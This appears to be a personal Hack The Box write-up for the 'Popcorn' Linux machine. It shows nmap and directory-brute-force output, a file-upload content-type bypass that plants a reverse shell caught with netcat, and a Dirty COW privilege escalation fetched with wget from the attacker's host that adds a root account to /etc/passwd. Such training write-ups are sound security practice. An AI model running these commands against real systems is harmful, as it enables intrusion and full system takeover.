# [Popcorn] - [HTB]  
**Difficulty:** [Medium]  
**OS:** [Linux]  
**Date:** [07/09/2025]  

---

## 1. Summary
- **Objective:** [ ] Capture user flag  
- **Objective:** [ ] Capture root flag / administrator access  
- **Description / Notes:** [Brief overview of the machine, main services, challenges]  
- **Skills Practiced:** 
  - [X] Enumeration
  - [X] Web Exploitation
  - [X] Privilege Escalation
---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.10.10.6 -vv   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 13:49 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
Initiating Ping Scan at 13:49
Scanning 10.10.10.6 [4 ports]
Completed Ping Scan at 13:49, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:49
Completed Parallel DNS resolution of 1 host. at 13:49, 0.12s elapsed
Initiating SYN Stealth Scan at 13:49
Scanning 10.10.10.6 [1000 ports]
Discovered open port 22/tcp on 10.10.10.6
Discovered open port 80/tcp on 10.10.10.6
Completed SYN Stealth Scan at 13:49, 3.76s elapsed (1000 total ports)
Initiating Service scan at 13:49
Scanning 2 services on 10.10.10.6
Completed Service scan at 13:49, 7.84s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.6
Retrying OS detection (try #2) against 10.10.10.6
Retrying OS detection (try #3) against 10.10.10.6
Retrying OS detection (try #4) against 10.10.10.6
Retrying OS detection (try #5) against 10.10.10.6
Initiating Traceroute at 13:49
Completed Traceroute at 13:49, 0.21s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 13:49
Completed Parallel DNS resolution of 2 hosts. at 13:49, 6.55s elapsed
NSE: Script scanning 10.10.10.6.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 6.70s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.83s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
Nmap scan report for 10.10.10.6
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2025-09-07 13:49:11 IST for 43s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIAn8zzHM1eVS/OaLgV6dgOKaT+kyvjU0pMUqZJ3AgvyOrxHa2m+ydNk8cixF9lP3Z8gLwquTxJDuNJ05xnz9/DzZClqfNfiqrZRACYXsquSAab512kkl+X6CexJYcDVK4qyuXRSEgp4OFY956Aa3CCL7TfZxn+N57WrsBoTEb9PAAAAFQDMosEYukWOzwL00PlxxLC+lBadWQAAAIAhp9/JSROW1jeMX4hCS6Q/M8D1UJYyat9aXoHKg8612mSo/OH8Ht9ULA2vrt06lxoC3O8/1pVD8oztKdJgfQlWW5fLujQajJ+nGVrwGvCRkNjcI0Sfu5zKow+mOG4irtAmAXwPoO5IQJmP0WOgkr+3x8nWazHymoQlCUPBMlDPvgAAAIBmZAfIvcEQmRo8Ef1RaM8vW6FHXFtKFKFWkSJ42XTl3opaSsLaJrgvpimA+wc4bZbrFc4YGsPc+kZbvXN3iPUvQqEldak3yUZRRL3hkF3g3iWjmkpMG/fxNgyJhyDy5tkNRthJWWZoSzxS7sJyPCn6HzYvZ+lKxPNODL+TROLkmQ==
|   2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyBXr3xI9cjrxMH2+DB7lZ6ctfgrek3xenkLLv2vJhQQpQ2ZfBrvkXLsSjQHHwgEbNyNUL+M1OmPFaUPTKiPVP9co0DEzq0RAC+/T4shxnYmxtACC0hqRVQ1HpE4AVjSagfFAmqUvyvSdbGvOeX7WC00SZWPgavL6pVq0qdRm3H22zIVw/Ty9SKxXGmN0qOBq6Lqs2FG8A14fJS9F8GcN9Q7CVGuSIO+UUH53KDOI+vzZqrFbvfz5dwClD19ybduWo95sdUUq/ECtoZ3zuFb6ROI5JJGNWFb6NqfTxAM43+ffZfY28AjB1QntYkezb1Bs04k8FYxb5H7JwhWewoe8xQ==
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.12
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Did not follow redirect to http://popcorn.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/7%OT=22%CT=1%CU=37655%PV=Y%DS=2%DC=T%G=Y%TM=68BD402A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=C7%GCD=1%ISR=CC%TI=Z%CI=Z%II=I%TS=8)SEQ(SP
OS:=C9%GCD=1%ISR=CC%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=C9%GCD=1%ISR=D0%TI=Z%CI=Z%II
OS:=I%TS=8)SEQ(SP=CC%GCD=1%ISR=D1%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=D0%GCD=1%ISR=C
OS:A%TI=Z%CI=Z%II=I%TS=8)OPS(O1=M577ST11NW6%O2=M577ST11NW6%O3=M577NNT11NW6%
OS:O4=M577ST11NW6%O5=M577ST11NW6%O6=M577ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4
OS:=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M577NNSNW6%CC=Y%Q=)T1(R
OS:=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.014 days (since Sun Sep  7 13:29:54 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=208 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   198.70 ms 10.10.14.1
2   198.76 ms 10.10.10.6

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:49
Completed NSE at 13:49, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.07 seconds
           Raw packets sent: 1420 (67.030KB) | Rcvd: 1088 (47.326KB)
```
I added the Ip into /etc/hosts and visit the website it shows like this
<img width="914" height="385" alt="image" src="https://github.com/user-attachments/assets/27211dab-147a-4a4a-81a7-894869f892a0" />
Then I started directory searching I found some of webpages
```bash
┌──(sabeshan㉿kali)-[~]
└─$ dirsearch -u http://popcorn.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sabeshan/reports/http_popcorn.htb/__25-09-07_13-59-47.txt

Target: http://popcorn.htb/

[13:59:47] Starting: 
[14:00:02] 403 -  240B  - /.ht_wsr.txt                                      
[14:00:02] 403 -  238B  - /.htaccess.bak1                                   
[14:00:02] 403 -  239B  - /.htaccess.orig                                   
[14:00:02] 403 -  239B  - /.htaccess.sample
[14:00:02] 403 -  240B  - /.htaccess_extra
[14:00:02] 403 -  238B  - /.htaccess.save
[14:00:02] 403 -  237B  - /.htaccessOLD
[14:00:02] 403 -  238B  - /.htaccess_sc                                     
[14:00:02] 403 -  238B  - /.htaccessOLD2
[14:00:02] 403 -  238B  - /.htaccessBAK
[14:00:02] 403 -  240B  - /.htaccess_orig                                   
[14:00:02] 403 -  234B  - /.htm                                             
[14:00:02] 403 -  234B  - /.html                                            
[14:00:02] 403 -  243B  - /.htpasswd_test                                   
[14:00:02] 403 -  238B  - /.htpasswds                                       
[14:00:02] 403 -  238B  - /.httr-oauth
[14:00:50] 403 -  238B  - /cgi-bin/                                         
[14:01:05] 403 -  238B  - /doc/api/                                         
[14:01:05] 403 -  243B  - /doc/stable.version                               
[14:01:05] 403 -  235B  - /doc/                                             
[14:01:05] 403 -  242B  - /doc/html/index.html                              
[14:01:05] 403 -  244B  - /doc/en/changes.html                              
[14:02:18] 200 -    8KB - /test                                             
[14:02:18] 200 -    8KB - /test.php
[14:02:18] 200 -    8KB - /test/tmp/                                        
[14:02:18] 200 -    8KB - /test/version_tmp/                                
[14:02:18] 200 -    8KB - /test/
[14:02:18] 200 -    8KB - /test/reports                                     
                                                                             
Task Completed
```
The webpage was appeared like this i do the further enumeration and all.
<img width="1919" height="848" alt="image" src="https://github.com/user-attachments/assets/b75c6545-d071-43fe-97cb-2a3b8b7ad04a" />
I run the gobsuter and identify the some more directiories
```bash
┌──(myenv)─(sabeshan㉿kali)-[~]
└─$ gobuster dir -u http://popcorn.htb/ -w /usr/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://popcorn.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 177]
/test                 (Status: 200) [Size: 47349]
/torrent              (Status: 301) [Size: 312] [--> http://popcorn.htb/torrent/]
/rename               (Status: 301) [Size: 311] [--> http://popcorn.htb/rename/]
===============================================================
Finished
===============================================================
```
I have the webpage with torrent sites and I tried to uplaod the files for checking file uploaded vulnerability.

<img width="1919" height="862" alt="image" src="https://github.com/user-attachments/assets/150de549-b6b6-44db-8def-c65cd3d343bc" />

and I uploaded the sample torrent file and explore the website.

<img width="1642" height="814" alt="image" src="https://github.com/user-attachments/assets/0fc056e8-6bdc-4efa-9c58-bcf22ef1800a" />

And find the uplaod directory with gobuster
```bash
┌──(myenv)─(sabeshan㉿kali)-[~]
└─$ gobuster dir -u http://popcorn.htb/torrent/ -w /usr/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://popcorn.htb/torrent/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/secure               (Status: 200) [Size: 4]
/users                (Status: 301) [Size: 318] [--> http://popcorn.htb/torrent/users/]
/config               (Status: 200) [Size: 0]
/index                (Status: 200) [Size: 11406]
/css                  (Status: 301) [Size: 316] [--> http://popcorn.htb/torrent/css/]
/admin                (Status: 301) [Size: 318] [--> http://popcorn.htb/torrent/admin/]
/js                   (Status: 301) [Size: 315] [--> http://popcorn.htb/torrent/js/]
/lib                  (Status: 301) [Size: 316] [--> http://popcorn.htb/torrent/lib/]
/edit                 (Status: 200) [Size: 0]
/preview              (Status: 200) [Size: 28104]
/templates            (Status: 301) [Size: 322] [--> http://popcorn.htb/torrent/templates/]
/images               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/images/]
/database             (Status: 301) [Size: 321] [--> http://popcorn.htb/torrent/database/]
/rss                  (Status: 200) [Size: 1700]
/login                (Status: 200) [Size: 8416]
/download             (Status: 200) [Size: 0]
/browse               (Status: 200) [Size: 9320]
/health               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/health/]
/logout               (Status: 200) [Size: 183]
/comment              (Status: 200) [Size: 936]
/upload               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/upload/]
/readme               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/readme/]
/stylesheet           (Status: 200) [Size: 321]
/torrents             (Status: 301) [Size: 321] [--> http://popcorn.htb/torrent/torrents/]
/thumbnail            (Status: 200) [Size: 1789]
/hide                 (Status: 200) [Size: 3765]
/upload_file          (Status: 200) [Size: 0]
/validator            (Status: 200) [Size: 0]
Progress: 17770 / 17771 (99.99%)
===============================================================
Finished
=============================================================
```
I upload the file with changing the image file and bypass the content type and I upload the reverse shell.
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.6] 37601
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 12:25:31 up  1:29,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: no job control in this shell
www-data@popcorn:/$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@popcorn:/$ ^Z
zsh: suspended  nc -lvnp 1337
```
we can read the user.txt with this and I identified the priv esc for this
```bash
www-data@popcorn:/home/george$  ls -lAR /home/george
/home/george:
total 852
lrwxrwxrwx 1 george george      9 Oct 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
-rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
-rw-r--r-- 1 george george    675 Mar 17  2017 .profile
-rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
-rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
-rw-r--r-- 1 george george     33 Sep  7 10:56 user.txt

/home/george/.cache:
total 0
-rw-r--r-- 1 george george 0 Mar 17  2017 motd.legal-displayed
```
using dirtycow for gaining the root priviledge https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
```bash
ww-data@popcorn:/var/www$ wget http://10.10.14.18:8000/dirty.c
--2025-09-07 13:23:51--  http://10.10.14.18:8000/dirty.c
Connecting to 10.10.14.18:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4795 (4.7K) [text/x-csrc]
Saving to: `dirty.c'

100%[======================================>] 4,795       --.-K/s   in 0.01s   

2025-09-07 13:23:51 (316 KB/s) - `dirty.c' saved [4795/4795]

www-data@popcorn:/var/www$ gcc -pthread dirty.c -o dirty -lcrypt  
www-data@popcorn:/var/www$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
toor:toGAh/yjoda7o:0:0:pwned:/root:/bin/bash

mmap: b782b000
^Z
[1]+  Stopped                 ./dirty
www-data@popcorn:/var/www$ su toor
Password: 
```
